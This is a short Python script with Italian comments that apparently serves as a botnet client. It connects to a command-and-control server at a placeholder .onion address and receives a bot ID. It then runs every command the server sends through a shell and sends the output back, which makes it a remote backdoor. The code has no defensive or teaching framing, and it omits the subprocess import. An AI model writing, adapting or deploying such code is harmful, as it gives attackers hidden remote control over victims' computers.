import socket

HOST = 'address.onion'  # Sostituisci con l'indirizzo.onion che hai creato
PORT = 1234

bot_id = None

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((HOST, PORT))

    # Aspetta che il server C2 ti dia l'ID
    while not bot_id:
        response = s.recv(1024)
        bot_id = response.decode()

    print(f"Bot {bot_id} connected to C2 server.")

    # Aspetta che il server C2 invii i comandi
    while True:
        response = s.recv(1024)
        command = response.decode().strip()

        if not command:
            continue
        if command == "quit":
            break

        # Esegue e manda indietro l'output al server C2 per modifiche in seguito
        output = subprocess.check_output(command, shell=True)
        s.sendall(output)
